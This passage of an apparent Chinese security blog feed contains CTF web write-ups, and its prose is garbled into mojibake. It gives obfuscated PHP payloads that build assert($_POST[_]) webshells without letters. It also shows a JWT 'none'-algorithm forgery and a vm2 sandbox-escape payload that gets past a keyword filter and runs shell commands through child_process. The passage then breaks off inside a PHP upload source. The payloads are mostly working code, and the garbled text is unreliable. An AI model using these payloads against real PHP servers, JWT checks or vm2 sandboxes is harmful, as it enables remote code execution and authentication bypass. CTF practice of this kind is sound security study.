Xorï¼ˆæŒ‰ä½å¼‚æˆ–ï¼‰ å°†æŠŠ <code>$a</code> å’Œ <code>$b</code> ä¸­ä¸€ä¸ªä¸º 1 å¦ä¸€ä¸ªä¸º 0 çš„ä½è®¾ä¸º 1</p><p>ä¸¤ä¸ªå­—ç¬¦ä¸²å¼‚æˆ–åä»æ˜¯å­—ç¬¦ä¸²</p></blockquote><p>è¿™åº”è¯¥æ˜¯è¿™ä¸‰ç§æ–¹æ³•ä¸­æœ€å¸¸ç”¨çš„ä¸€ä¸ªï¼ˆå› ä¸º Google æŸ¥åˆ°æœ€å¤šçš„æ˜¯è¿™ç§æ–¹æ³•ï¼‰ï¼Œå…·ä½“é€‰ç”¨å“ªäº›å­—ç¬¦è¿›è¡Œå¼‚æˆ–ç›´æ¥æŸ¥ ASCII ç è¡¨å°±å¥½ï¼ˆæ„é€ å°å†™å­—æ¯é‡‡ç”¨åå¼•å· <code>`</code> ï¼Œæ„é€ å¤§å†™å­—æ¯é‡‡ç”¨ <code>@</code> æ¯”è¾ƒæ–¹ä¾¿ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?code&#x3D;$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;);$__&#x3D;&#39;_&#39;.(&#39;%10&#39;^&#39;@&#39;).(&#39;%0F&#39;^&#39;@&#39;).(&#39;%13&#39;^&#39;@&#39;).(&#39;%14&#39;^&#39;@&#39;);$___&#x3D;$$__;$_($___[_]);</span><br></pre></td></tr></table></figure><p>æ•´ç†ä¸€ä¸‹å³ä¸ºä»¥ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = <span class="string">'assert'</span>;</span><br><span class="line">$__ = <span class="string">'_POST'</span>;</span><br><span class="line">$___ = $$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_])</span></span><br></pre></td></tr></table></figure><h3 id="æ³•äºŒï¼šå–å"><a href="#æ³•äºŒï¼šå–å" class="headerlink" title="æ³•äºŒï¼šå–å"></a>æ³•äºŒï¼šå–å</h3><blockquote><p>å–åå³ PHP ä¸­çš„è¿ç®—ç¬¦ <code>~</code></p><p><code>~$a</code> Notï¼ˆæŒ‰ä½å–åï¼‰ å°† <code>$a</code> ä¸­ä¸º 0 çš„ä½è®¾ä¸º 1ï¼Œåä¹‹äº¦ç„¶</p><p>å­—ç¬¦ä¸²å–ååä»æ˜¯å­—ç¬¦ä¸²</p></blockquote><p>åœ¨å¼‚æˆ–è¿ç®—ç¬¦ <code>^</code> è¢«è¿‡æ»¤æ—¶å¯ä»¥è€ƒè™‘è¿™ç§æ–¹æ³•ï¼Œä¹Ÿæ˜¯æ‹›æ–° BOSS é¢˜ä¸­ç”¨åˆ°çš„æ–¹æ³•ï¼Œä¾ç„¶æŸ¥ ASCII ç è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?code&#x3D;$_&#x3D;~&#39;%9E%8C%8C%9A%8D%8B&#39;;$__&#x3D;~&#39;%AF%B0%ACAB&#39;;$___&#x3D;$$__;$_($___[_]);</span><br></pre></td></tr></table></figure><p>æ•´ç†ä¸€ä¸‹å³ä¸ 0x02 ä¸­ä»£ç ç›¸åŒ</p><p>å¦é™„ä¸€ä¸ªå°†å­—ç¬¦ä¸²è½¬æ¢æˆä¸Šè¿°å–åæ ¼å¼çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line">s = <span class="string">'assert'</span></span><br><span class="line">print(<span class="string">"~'"</span>, end=<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    i1 = hex(<span class="number">15</span> - int(hex(ord(i))[<span class="number">-2</span>]))[<span class="number">-1</span>].upper()</span><br><span class="line">    i2 = hex(<span class="number">15</span> - int(hex(ord(i))[<span class="number">-1</span>]))[<span class="number">-1</span>].upper()</span><br><span class="line">    print(<span class="string">'%'</span> + i1 + i2, end=<span class="string">''</span>)</span><br><span class="line">print(<span class="string">"'"</span>) <span class="comment"># ~'%9E%8C%8C%9A%8D%8B'</span></span><br></pre></td></tr></table></figure><h3 id="æ³•ä¸‰ï¼šå­—ç¬¦é€’å¢"><a href="#æ³•ä¸‰ï¼šå­—ç¬¦é€’å¢" class="headerlink" title="æ³•ä¸‰ï¼šå­—ç¬¦é€’å¢"></a>æ³•ä¸‰ï¼šå­—ç¬¦é€’å¢</h3><p>é‚£ä¹ˆå¦‚æœå¼‚æˆ–è¿ç®—ç¬¦å’Œå–åè¿ç®—ç¬¦éƒ½è¢«è¿‡æ»¤äº†è¯¥æ€ä¹ˆåŠå‘¢ï¼Œè¿™é‡Œå°±è¦ç”¨åˆ°é€’å¢è¿ç®—ç¬¦ <code>++</code></p><p>ç„¶è€Œæ€ä¹ˆè·å¾—ç”¨æ¥é€’å¢çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œè¿™ç”¨åˆ°äº† PHP çš„ä¸€ä¸ªç‰¹æ€§</p><blockquote><p>åœ¨è¯•å›¾å°†æ•°ç»„è½¬æ¢æˆå­—ç¬¦ä¸²æ—¶ä¼šè·å¾—å­—ç¬¦ä¸² â€˜Arrayâ€™</p></blockquote><p>å¯ä»¥ç”¨ä»¥ä¸‹ä»£ç æ¼”ç¤ºè¿™ä¸ªç‰¹æ€§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = [];</span><br><span class="line">$b = <span class="string">"$a"</span>;</span><br><span class="line"><span class="keyword">echo</span> $b; <span class="comment">// Array</span></span><br></pre></td></tr></table></figure><p>åˆç”±äº PHP ä¸­å‡½æ•°åå¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œæˆ‘ä»¬å¯ä»¥æ„é€  <code>ASSERT($_POST[_])</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?code&#x3D;$_&#x3D;[];$__&#x3D;&quot;$_&quot;;$___&#x3D;$__[&#39;@&#39;&#x3D;&#x3D;&#39;!&#39;];$_&#x3D;$___;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$____&#x3D;$___;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$_____&#x3D;$___;$___%2B%2B;$______&#x3D;$___;$___%2B%2B;$___%2B%2B;$_______&#x3D;$___;$___%2B%2B;$________&#x3D;$___;$___%2B%2B;$_________&#x3D;$___;$_&#x3D;$_.$________.$________.$____.$_______.$_________; $__&#x3D;&#39;_&#39;.$______.$_____.$________.$_________; $___&#x3D;$$__;$_($___[_]);</span><br></pre></td></tr></table></figure><p>æ•´ç†å³ä¸ºä»¥ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = [];</span><br><span class="line">$__ = <span class="string">"$_"</span>; <span class="comment">// Array</span></span><br><span class="line">$___ = $__[<span class="string">'@'</span> == <span class="string">'#'</span>]; <span class="comment">// A</span></span><br><span class="line">$_ = $___; <span class="comment">// A</span></span><br><span class="line">$___++;$___++;$___++;$___++;</span><br><span class="line">$____ = $___; <span class="comment">// E</span></span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$_____ = $___; <span class="comment">// O</span></span><br><span class="line">$___++;</span><br><span class="line">$______ = $___; <span class="comment">// P</span></span><br><span class="line">$___++;$___++;</span><br><span class="line">$_______ = $___; <span class="comment">// R</span></span><br><span class="line">$___++;</span><br><span class="line">$________ = $___; <span class="comment">// S</span></span><br><span class="line">$___++;</span><br><span class="line">$_________ = $___; <span class="comment">// T</span></span><br><span class="line">$_ = $_.$________.$________.$____.$_______.$_________; <span class="comment">// ASSERT</span></span><br><span class="line">$__ = <span class="string">'_'</span>.$______.$_____.$________.$_________; <span class="comment">//POST</span></span><br><span class="line">$___ = $$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_])</span></span><br></pre></td></tr></table></figure><h2 id="0x03-PHP7-ä¸­å¯ç”¨çš„æ–¹æ³•"><a href="#0x03-PHP7-ä¸­å¯ç”¨çš„æ–¹æ³•" class="headerlink" title="0x03 PHP7 ä¸­å¯ç”¨çš„æ–¹æ³•"></a>0x03 PHP7 ä¸­å¯ç”¨çš„æ–¹æ³•</h2><ol><li><p>å¦‚æœ web ç”¨æˆ·æœ‰è¯»å†™æƒé™ï¼Œå¯ä»¥ç›´æ¥ç”¨ <code>file_put_content</code> å‡½æ•°å°†æœ¨é©¬å†™å…¥æ–‡ä»¶</p></li><li><p>å¦‚æœæ— è¯»å†™æƒé™ï¼Œå¯ä»¥ç”¨ä¸Šè¿°å„ç§æ–¹æ³•æ„é€ å‡ºè‡ªå·±éœ€è¦çš„å‡½æ•°å†æ‰§è¡Œï¼Œæ³•ä¸‰ç»è¿‡ä¸€å®šæ“ä½œç†è®ºä¸Šå¯ä»¥æ„é€ å‡ºæ‰€æœ‰å­—æ¯ï¼ˆå¤§å†™å’Œå°å†™ï¼‰å’Œæ•°å­—ï¼Œå°å†™å­—æ¯å’Œæ•°å­—å¯ä»¥ç”¨ä»¥ä¸‹æ–¹æ³•å†ç»“åˆé€’å¢é€’å‡å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = [];</span><br><span class="line">$__ = <span class="string">"$_"</span>; <span class="comment">// Array</span></span><br><span class="line">$___ = $__[<span class="string">'@'</span> == <span class="string">'#'</span>]; <span class="comment">// A</span></span><br><span class="line">$_ = $___; <span class="comment">// A</span></span><br><span class="line">$___++;$___++;$___++;</span><br><span class="line">$____ = $___; <span class="comment">// D</span></span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$_____ = $___; <span class="comment">// O</span></span><br><span class="line">$___++;$___++;$___++;</span><br><span class="line">$______ = $___; <span class="comment">// R</span></span><br><span class="line">$_______ = $_____.$______.$____; <span class="comment">// ORD</span></span><br><span class="line">$________ = $_______($____) - $_______($_); <span class="comment">// 3 ï¼ˆæ•°å­—åœ¨è¿™ï¼‰</span></span><br><span class="line">$____ = $__[$________]; <span class="comment">// a ï¼ˆå°å†™å­—æ¯åœ¨è¿™ï¼‰</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>å’•äº†å¥½ä¹…æ‰æƒ³èµ·æ¥æœ‰ç¯‡åšå®¢æ²¡å†™å®Œï¼Œç»“æœè¿™ä¸¤å¤©åˆé‡åˆ°ä¸€æ¬¡ä¾ç„¶ä¸ä¼šï¼ˆå°±æ˜¯ç”¨åˆ°äº†æ³•ä¸‰ï¼‰ï¼Œè·Ÿåœ¨ğŸ™çˆ·çˆ·åé¢<del>åš</del>çœ‹å®Œé¢˜æ‰æƒ³èµ·æ¥ï¼Œå§æ§½è¿™ä¸ªæˆ‘çœ‹è¿‡ï¼ˆä½†æ˜¯è¿˜æ²¡å†™</p><p>è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬ï¼Œé¸½å­è¿Ÿæ—©æ˜¯è¦è¢«ç‚–äº†çš„ï¼ˆé€ƒ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;åˆæ˜¯å¥½å¤šå¤©æ²¡å†™åšå®¢äº†ï¼Œå°±æƒ³ç€å†æ¥éšä¾¿æ°´ç‚¹ä»€ä¹ˆå§&lt;/p&gt;&lt;p&gt;è¿™ç§ç¥å¥‡çš„é¢˜æ›¾ç»åœ¨ &lt;a href=&quot;/
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>è™ç¬¦ CTF WEB éƒ¨åˆ†å¤ç°</title>
    <link href="https://x5tar.com/2020/04/22/hfctf-web/"/>
    <id>https://x5tar.com/2020/04/22/hfctf-web/</id>
    <published>2020-04-22T07:17:37.000Z</published>
    <updated>2020-05-03T09:24:58.769Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å½“æ—¶æ¯”èµ›çš„æ—¶å€™ï¼Œä¸€å…±ä¸‰é“ WEB é¢˜ï¼Œä¸¤é“ nodejs çš„éƒ½ä¸ä¼šï¼Œè¿˜æœ‰ä¸€é“ PHP æ²¡æ¥å¾—åŠçœ‹åæ¥çœ‹äº†ä¹Ÿä¸ä¼šï¼ˆè¿˜æ˜¯å¤ªèœäº†</p><p>è¶é¢˜è¿˜çƒ­ä¹ï¼Œå€Ÿç€ dalao ä»¬çš„ WP å¤ç°ä¸€æ³¢</p><h2 id="0x01-easy-login"><a href="#0x01-easy-login" class="headerlink" title="0x01 easy_login"></a>0x01 easy_login</h2><p>ç”±äºé™æ€æ–‡ä»¶çš„é…ç½®é—®é¢˜ï¼Œæœ‰ä¸€å¤§æ³¢æºç æ³„éœ²ï¼ˆæ¯”èµ›æ—¶åªçœ‹åˆ°äº†è¿™ä¸ª</p><p>åªæœ‰ admin å¯ä»¥çœ‹åˆ° flagï¼Œè€Œæˆ‘ä»¬ä¸èƒ½æ³¨å†Œåä¸º admin çš„ç”¨æˆ·ï¼Œåªèƒ½æƒ³åŠæ³•ä¼ªé€ </p><p>é¢˜ç›®éƒ½è¯´äº†é”™çš„æ˜¯ä¾èµ–åº“ï¼Œæ¯”èµ›çš„æ—¶å€™å±…ç„¶æ²¡æ³¨æ„åˆ°ï¼Œè¿™é‡Œçš„å…³é”®åœ¨äºç”¨äº† jsonwebtoken åº“ï¼Œé‡ç‚¹åœ¨ç™»å½•çš„ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'POST /api/login'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'username or password is necessary'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>é‡ç‚¹åœ¨ jwt åº“å­˜åœ¨ç¼ºé™·</p><blockquote><p>å½“åŠ å¯†æ—¶ä½¿ç”¨çš„æ˜¯ none æ–¹æ³•ï¼ŒéªŒè¯æ—¶åªè¦å¯†é’¥å¤„ä¸º undefined æˆ–è€…ç©ºä¹‹ç±»çš„ï¼Œå³ä¾¿åé¢çš„ç®—æ³•æŒ‡åä¸º HS256ï¼ŒéªŒè¯ä¹Ÿè¿˜æ˜¯æŒ‰ç…§ none æ¥éªŒè¯é€šè¿‡</p></blockquote><p>æˆ‘ä»¬åªè¦ä½¿è¿™é‡Œçš„ secret ä¸º undifined æˆ– null å³å¯ï¼Œä½† sid ä¸èƒ½ä¸º undefined æˆ– null</p><p>æµ‹è¯•å‘ç°ï¼Œå½“æ•°ç»„ç´¢å¼•ä¸ºæµ®ç‚¹æ•°æ—¶ï¼Œå¾—åˆ°çš„ç»“æœä¸º undefined</p><img src="/2020/04/22/hfctf-web/list.jpg"><p>å¯ä»¥ç”¨ python æ„é€  token</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">print(jwt.encode(&#123;<span class="string">"secretid"</span>:<span class="number">0.1</span>,<span class="string">"username"</span>:<span class="string">"admin"</span>,<span class="string">"password"</span>:<span class="string">"123"</span>&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p>å‘é€æ„é€ çš„ token å³å¯ä»¥ admin èº«ä»½ç™»å½•ï¼Œè·å¾— flag</p><h2 id="0x02-just-escape"><a href="#0x02-just-escape" class="headerlink" title="0x02 just_escape"></a>0x02 just_escape</h2><p>çœ‹èµ·æ¥åç¼€æ˜¯ php å®é™…ä¸Šåç«¯æ˜¯ nodejs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;Error().stack;</span><br><span class="line"></span><br><span class="line">Error</span><br><span class="line">    at vm.js:1:1</span><br><span class="line">    at Script.runInContext (vm.js:131:20)</span><br><span class="line">    at VM.run (&#x2F;app&#x2F;node_modules&#x2F;vm2&#x2F;lib&#x2F;main.js:219:62)</span><br><span class="line">    at &#x2F;app&#x2F;server.js:51:33</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at next (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13)</span><br><span class="line">    at Route.dispatch (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at &#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22</span><br><span class="line">    at Function.process_params (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯ç”¨äº† vmï¼ŒGitHub ä¸Šæœ‰ä¸€ä¸ªé€ƒé€¸çš„ <a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">payload</a></p><p>ä½†æ˜¯è¿™é‡Œè¿‡æ»¤äº†ä¸€äº›å…³é”®å­—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for while process exec eval constructor prototype Function + &quot; &#39;</span><br></pre></td></tr></table></figure><p>æ ¹æ® cg çš„ payloadï¼Œå¼•å·å¯ä»¥ç”¨ String.fromCharCode ç»•è¿‡</p><p>è¿™é‡Œç»™ä¸€ä¸ªè½¬æˆè¿™ä¸ªå‡½æ•°å½¢å¼çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"return process"</span></span><br><span class="line">payload = <span class="string">"String.fromCharCode("</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    payload += str(ord(c)) + <span class="string">','</span></span><br><span class="line">payload = payload.strip(<span class="string">','</span>) + <span class="string">')'</span></span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¢«è¿‡æ»¤çš„æ–¹æ³•åå¯ä»¥ç”¨ JavaScript çš„å¦ä¸€ç§æ–¹æ³•è°ƒç”¨å½¢å¼ï¼Œå³å°†æ–¹æ³•åå½“ä½œæ•°ç»„ç´¢å¼•çš„å½¢å¼åŠ ä¸Š String.fromCharCode ç»•è¿‡</p><img src="/2020/04/22/hfctf-web/bypass.jpg"><p>æœ€ç»ˆ paylaod å¦‚ä¸‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;Buffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;,&#123;getOwnPropertyDescriptor()&#123;<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="built_in">String</span>.fromCharCode(<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">114</span>)](<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>))();&#125;&#125;));&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="built_in">String</span>.fromCharCode(<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>))[<span class="built_in">String</span>.fromCharCode(<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">83</span>,<span class="number">121</span>,<span class="number">110</span>,<span class="number">99</span>)](<span class="built_in">String</span>.fromCharCode(<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>)).toString();&#125;&#125;)()</span><br></pre></td></tr></table></figure><p>æˆåŠŸè·å¾— flag</p><h2 id="0x03-babyupload"><a href="#0x03-babyupload" class="headerlink" title="0x03 babyupload"></a>0x03 babyupload</h2><p>è¿™ä¸ªæ˜¯çœŸ PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">"/var/babyctf/"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"/flag"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] ===<span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">'/var/babyctf/success.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] =<span class="string">'guest'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">'direction'</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">'attr'</span>);</span><br><span class="line">$dir_path = <span class="string">"/var/babyctf/"</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">"private"</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">"/"</span>.$_SESSION[<span class="string">'username'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">"upload"</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span 